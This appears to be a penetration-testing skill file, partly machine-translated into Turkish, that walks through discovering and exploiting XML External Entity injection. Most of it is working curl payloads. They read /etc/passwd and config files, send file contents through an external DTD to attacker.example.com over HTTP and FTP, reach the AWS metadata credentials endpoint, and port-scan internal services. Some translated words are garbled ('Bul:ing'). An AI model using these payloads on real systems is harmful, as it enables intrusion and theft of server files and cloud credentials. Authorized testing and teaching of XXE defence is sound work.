---
name: testing-for-xxe-injection-vulnerabilities
description: Discovering and exploiting XML External Entity injection vulnerabilities to read server files, perform SSRF, and exfiltrate data during authorized penetration tests.
tags:
- web-security
- penetration-testing
- owasp
- xml-injection
- fetih
- web-application-security
- burpsuite
- cybersecurity
- xxe
- siber-güvenlik
triggers:
- CSRF
- SQL injection
- XSS
- api
- cloud
- dns
- endpoint
- exploit
- http
- injection
- network
- testing
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Testing for Xxe Injection Vulnerabilities


## Ne Zaman Kullanılır

- During authorized penetration tests when the application processes XML input (SOAP APIs, file uploads, RSS feeds)
- testing yaparken APIs that accept `Content-Type: application/xml` or `text/xml`
- For assessing XML parsers in file upload functionality (DOCX, XLSX, SVG, PDF)
- evaluating yaparken: SOAP-based web services for entity injection
- During security assessments of enterprise applications using XML configuration

## Ön Gereksinimler

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: For intercepting and modifying XML requests
- **XXEinjector**: Automated XXE exploitation tool (`git clone https://github.com/enjoiz/XXEinjector.git`)
- **Out-of-band server**: Burp Collaborator or interactsh for blind XXE Tespit
- **curl**: For manual payload crafting and submission
- **Python**: For building DTD hosting server

## İş Akışı

### Adım 1: Identify XML Processing Points

Bul: all application endpoints that accept or process XML data.

```bash

curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"search":"test"}' \
  "https://target.example.com/api/search"

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><search>test</search></root>' \
  "https://target.example.com/api/search"


curl -s -X POST \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"\"" \
  -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test/></soap:Body></soap:Envelope>' \
  "https://target.example.com/ws/service"
```

### Adım 2: Test for Basic XXE with File Retrieval

Inject XML entities to read local files from the server.

```bash
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"
```

### Adım 3: Test Blind XXE with Out-of-Band Tespit

When the entity value is not reflected in the response, use out-of-band techniques.

```bash

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://abc123.oast.fun/xxe-test">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"


curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-confirmed.abc123.oast.fun">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://abc123.oast.fun/xxe-param">
  %xxe;
]>
<root><search>test</search></root>' \
  "https://target.example.com/api/search"
```

### Adım 4: Exfiltrate Data via Out-of-Band XXE

Use external DTD to extract file contents through HTTP requests.

```bash
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example.com/?data=%file;'>">
%eval;
%exfil;
EOF

cd /tmp && python3 -m http.server 8888 &

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.example.com:8888/evil.dtd">
  %dtd;
]>
<root><search>test</search></root>' \
  "https://target.example.com/api/search"

cat > /tmp/evil-ftp.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.example.com/%file;'>">
%eval;
%exfil;
EOF

```

### Adım 5: Test XXE via File Uploads

Test XML parsing in document upload functionality.

```bash
cat > /tmp/xxe.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>
EOF

curl -s -X POST \
  -F "file=@/tmp/xxe.svg;type=image/svg+xml" \
  -b "session=abc123" \
  "https://target.example.com/api/upload/avatar"

mkdir -p /tmp/xxe-docx
cd /tmp/xxe-docx
unzip /tmp/template.docx -d /tmp/xxe-docx


```

### Adım 6: Test XXE for Server-Side Request Forgery (SSRF)

Use XXE to make the server send requests to internal services.

```bash
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  echo -n "Port $port: "
  curl -s -X POST --max-time 5 \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:$port/\">]><root><search>&xxe;</search></root>" \
    "https://target.example.com/api/search" | head -c 100
  echo
done

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-admin.local:8080/admin">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **XML External Entity** | An entity defined in a DTD that references external resources via SYSTEM or PUBLIC keywords |
| **DTD (Document Type Definition)** | Defines the structure and legal elements of an XML document, including entity declarations |
| **Internal Entity** | Entity defined with a value directly in the DTD (`<!ENTITY name "value">`) |
| **External Entity** | Entity that loads content from a URI (`<!ENTITY name SYSTEM "uri">`) |
| **Parameter Entity** | Entity used within the DTD itself, prefixed with `%` (`<!ENTITY % name SYSTEM "uri">`) |
| **Blind XXE** | XXE where entity values are not reflected in the response, requiring out-of-band exfiltration |
| **Billion Laughs (DoS)** | Recursive entity expansion attack causing exponential memory consumption |
| **XXE to SSRF** | Using XXE to make the server send HTTP requests to internal or external services |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Request interception, modification, and Collaborator for OOB Tespit |
| **XXEinjector** | Automated XXE exploitation with file exfiltration and SSRF capabilities |
| **interactsh** | Out-of-band interaction server for Tespit etme blind XXE callbacks |
| **xxeserv** | Dedicated FTP/HTTP server for XXE data exfiltration |
| **OWASP ZAP** | Automated XXE scanning in active scan mode |
| **DTD-Bul:er** | Discovers DTD files on the server for entity injection |

## Common Scenarios

### Scenario 1: SOAP API File Read
A SOAP web service processes XML input without disabling external entities. Injecting a DTD with a SYSTEM entity in the SOAP body reads `/etc/passwd` and returns it in the SOAP response.

### Scenario 2: SVG Upload Blind XXE
An image upload feature accepts SVG files. The SVG is parsed server-side for thumbnail generation. Using a blind XXE payload in the SVG, server files are exfiltrated via out-of-band HTTP requests.

### Scenario 3: JSON to XML Content-Type Switch
A REST API primarily uses JSON but the XML parser is also enabled. Switching `Content-Type` to `application/xml` and sending an XXE payload exposes server files through the API response.

### Scenario 4: DOCX Processing XXE
A resume upload feature processes DOCX files. Injecting XXE into the `[Content_Types].xml` file within the DOCX archive triggers file read when the document is parsed server-side.

## Output Format

```
## XXE Injection Bul:ing

**Vulnerability**: XML External Entity (XXE) Injection
**Severity**: Critical (CVSS 9.1)
**Location**: POST /api/search (Content-Type: application/xml)
**OWASP Category**: A05:2021 - Security Misconfiguration

### Reproduction Steps
1. Send POST request to /api/search with Content-Type: application/xml
2. Include DTD with external entity: <!ENTITY xxe SYSTEM "file:///etc/passwd">
3. Reference entity in XML body: <search>&xxe;</search>
4. Server returns file contents in the response

### Confirmed Impact
- Local file read: /etc/passwd, /etc/hostname, application config files
- SSRF: Accessed AWS metadata at 169.254.169.254
- Internal network scanning: Identified internal services on ports 3306, 6379, 8080

### Files Retrieved
| File | Contents Summary |
|------|-----------------|
| /etc/passwd | 42 user accounts, service accounts identified |
| /var/www/html/config.php | Database credentials in plaintext |
| /etc/hostname | Internal hostname: prod-web-01 |

### Recommendation
1. Disable external entity processing in the XML parser
2. Disable DTD processing entirely if not required
3. Use JSON instead of XML where possible
4. Implement input validation to reject DTD declarations in XML input
5. Apply least-privilege file system permissions for the web server user
```
